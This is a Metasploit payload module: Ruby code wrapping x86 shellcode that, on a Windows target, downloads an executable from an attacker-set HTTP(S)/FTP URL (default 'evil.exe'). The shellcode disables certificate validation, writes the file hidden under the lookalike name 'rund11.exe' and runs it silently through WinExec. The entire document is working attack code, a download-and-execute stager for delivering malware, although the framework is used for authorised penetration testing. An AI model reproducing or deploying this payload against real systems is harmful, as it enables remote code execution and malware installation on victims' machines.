##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 429

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::BlockApi
  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Executable Download (http,https,ftp) and Execute',
      'Description'   => 'Download an EXE from an HTTP(S)/FTP URL and execute it',
      'Author'        =>
        [
          'corelanc0d3r <peter.ve[at]corelan.be>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86
    ))

    # Register command execution options
    register_options(
      [
        OptString.new('URL', [true, "The pre-encoded URL to the executable" ,"https://localhost:443/evil.exe"]),
        OptString.new('EXE', [ true, "Filename to save & run executable on target system", "rund11.exe" ])
      ])
  end

  #
  # Construct the payload
  #
  def generate(_opts = {})

    target_uri = datastore['URL'] || ""
    filename = datastore['EXE'] || ""
    proto = "https"
    dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
      #;0x80000000 |        ; INTERNET_FLAG_RELOAD
      #;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
      #;0x00800000 |        ; INTERNET_FLAG_SECURE
      #;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
      #;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
      #;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
      #;0x00000200          ; INTERNET_FLAG_NO_UI"

    exitfuncs = {
        "THREAD"  => Rex::Text.block_api_hash("kernel32.dll", "ExitThread").to_i(16), # ExitThread
        "PROCESS" => Rex::Text.block_api_hash("kernel32.dll", "ExitProcess").to_i(16), # ExitProcess
        "SEH"       => 0x00000000,	#we don't care
        "NONE"      => 0x00000000	#we don't care
        }

    protoflags = {
        "http"	=> 0x3,
        "https"	=> 0x3,
        "ftp"	=> 0x1
        }

    exitfunc = datastore['EXITFUNC'].upcase

    if exitfuncs[exitfunc]
      exitasm = case exitfunc
        when "SEH" then "xor eax,eax\ncall eax"
        when "NONE" then "jmp end"	# don't want to load user32.dll for GetLastError
        else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]
      end
    end

    # parse URL and break it down in
    # - remote host
    # - port
    # - /path/to/file

    server_uri  = ''
    server_host = ''
    port_nr     = 443	# default

    if target_uri.length > 0

      # get desired protocol
      if target_uri =~ /^http:/
        proto = "http"
        port_nr = 80
        dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
          #;0x00400000 |        ; INTERNET_FLAG_KEEP_CONNECTION
      end

      if target_uri =~ /^ftp:/
        proto = "ftp"
        port_nr = 21
        dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
      end

      # sanitize the input
      target_uri = target_uri.gsub('http://','')	#don't care about protocol
      target_uri = target_uri.gsub('https://','')	#don't care about protocol
      target_uri = target_uri.gsub('ftp://','')	#don't care about protocol

      server_info = target_uri.split("/")

      # did user specify a port ?
      server_parts = server_info[0].split(":")
      if server_parts.length > 1
        port_nr = Integer(server_parts[1])
      end

      # actual target host
      server_host = server_parts[0]

      # get /path/to/remote/exe

      for i in (1..server_info.length-1)
        server_uri << "/"
        server_uri << server_info[i]
      end

    end

    # get protocol specific stuff

    #create actual payload
    payload_data = %Q^
      cld
      call start
      #{asm_block_api}
    start:
      pop ebp                ; get ptr to block_api routine
    ; based on HDM's block_reverse_https.asm
    load_wininet:
      push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
      push 0x696e6977        ; ...
      mov esi, esp           ; Save a pointer to wininet
      push esp               ; Push a pointer to the "wininet" string on the stack.
      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}         ; hash( "kernel32.dll", "LoadLibraryA" )
      call ebp               ; LoadLibraryA( "wininet" )

    internetopen:
      xor edi,edi
      push edi               ; DWORD dwFlags
      push edi               ; LPCTSTR lpszProxyBypass
      push edi               ; LPCTSTR lpszProxyName
      push edi               ; DWORD dwAccessType (PRECONFIG = 0)
      push esi               ; LPCTSTR lpszAgent ("wininet\x00")
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}       ; hash( "wininet.dll", "InternetOpenA" )
      call ebp

      jmp.i8 dbl_get_server_host

    internetconnect:
      pop ebx                ; Save the hostname pointer
      xor ecx, ecx
      push ecx               ; DWORD_PTR dwContext (NULL)
      push ecx               ; dwFlags
      push #{protoflags[proto]}	; DWORD dwService (INTERNET_SERVICE_HTTP or INTERNET_SERVICE_FTP)
      push ecx               ; password
      push ecx               ; username
      push #{port_nr}        ; PORT
      push ebx               ; HOSTNAME
      push eax               ; HINTERNET hInternet
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}    ; hash( "wininet.dll", "InternetConnectA" )
      call ebp

      jmp.i8 get_server_uri

    httpopenrequest:
      pop ecx
      xor edx, edx            ; NULL
      push edx                ; dwContext (NULL)
      #{dwflags_asm}          ; dwFlags
      push edx                ; accept types
      push edx                ; referrer
      push edx                ; version
      push ecx                ; url
      push edx                ; method
      push eax                ; hConnection
      push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}    ; hash( "wininet.dll", "HttpOpenRequestA" )
      call ebp
      mov esi, eax            ; hHttpRequest

    set_retry:
      push 0x10
      pop ebx

    ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
    set_security_options:
      push 0x00003380
      mov eax, esp
      push 4                 ; sizeof(dwFlags)
      push eax               ; &dwFlags
      push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
      push esi               ; hRequest
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}   ; hash( "wininet.dll", "InternetSetOptionA" )
      call ebp

    httpsendrequest:
      xor edi, edi
      push edi               ; optional length
      push edi               ; optional
      push edi               ; dwHeadersLength
      push edi               ; headers
      push esi               ; hHttpRequest
      push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}    ; hash( "wininet.dll", "HttpSendRequestA" )
      call ebp
      test eax,eax
      jnz create_file

    try_it_again:
      dec ebx
      jz thats_all_folks	; failure -> exit
      jmp.i8 set_security_options

    dbl_get_server_host:
      jmp get_server_host

    get_server_uri:
      call httpopenrequest

    server_uri:
      db "#{server_uri}", 0x00

    create_file:
      jmp.i8 get_filename

    get_filename_return:
      xor eax,eax       ; zero eax
      pop edi           ; ptr to filename
      push eax          ; hTemplateFile
      push 2            ; dwFlagsAndAttributes (Hidden)
      push 2            ; dwCreationDisposition (CREATE_ALWAYS)
      push eax          ; lpSecurityAttributes
      push 2            ; dwShareMode
      push 2            ; dwDesiredAccess
      push edi          ; lpFileName
      push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}    ; kernel32.dll!CreateFileA
      call ebp

    download_prep:
      xchg eax, ebx     ; place the file handle in ebx
      xor eax,eax       ; zero eax
      mov ax,0x304      ; we'll download 0x300 bytes at a time
      sub esp,eax       ; reserve space on stack

    download_more:
      push esp          ; &bytesRead
      lea ecx,[esp+0x8] ; target buffer
      xor eax,eax
      mov ah,0x03       ; eax => 300
      push eax          ; read length
      push ecx          ; target buffer on stack
      push esi          ; hRequest
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}   ; hash( "wininet.dll", "InternetReadFile" )
      call ebp

      test eax,eax        ; download failed? (optional?)
      jz thats_all_folks  ; failure -> exit

      pop eax             ; how many bytes did we retrieve ?

      test eax,eax        ; optional?
      je close_and_run    ; continue until it returns 0

    write_to_file:
      push 0              ; lpOverLapped
      push esp            ; lpNumberOfBytesWritten
      push eax            ; nNumberOfBytesToWrite
      lea eax,[esp+0xc]   ; get pointer to buffer
      push eax            ; lpBuffer
      push ebx            ; hFile
      push #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}        ; kernel32.dll!WriteFile
      call ebp
      sub esp,4           ; set stack back to where it was
      jmp.i8 download_more

    close_and_run:
      push ebx
      push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}       ; kernel32.dll!CloseHandle
      call ebp

    execute_file:
      push 0             ; don't show
      push edi           ; lpCmdLine
      push #{Rex::Text.block_api_hash('kernel32.dll', 'WinExec')}     ; kernel32.dll!WinExec
      call ebp

    thats_all_folks:
      #{exitasm}

    get_filename:
      call get_filename_return
      db "#{filename}",0x00

    get_server_host:
      call internetconnect

    server_host:
      db "#{server_host}", 0x00
    end:
^
    self.assembly = payload_data
    super
  end
end
